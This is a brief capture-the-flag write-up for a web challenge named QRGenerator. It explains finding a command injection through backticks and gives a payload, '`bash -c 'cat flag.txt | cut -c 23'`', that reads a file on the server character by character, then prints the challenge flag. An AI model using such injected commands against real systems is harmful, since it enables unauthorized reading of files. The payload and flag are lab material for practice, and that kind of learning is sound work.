# QRGenerator

## Challenge
I was playing around with some stuff on my computer and found out that you can generate QR codes! I tried to make an online QR code generator, but it seems that's not working like it should be. Would you mind taking a look?

http://challs.houseplant.riceteacatpanda.wtf:30004

Dev: jammy
 Hint! For some reason, my website isn't too fond of backticks...
## Approach
It seems return one word and has the problem of backticks.
I have tried some commands after ` and found out change the return word.

## Solution
Input example
```
`bash -c 'cat flag.txt | cut -c 23' `;
```
I have tried some command and found out flag.txt exsist.
So I read flag.txt character by character.

## Flag
```
rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}
```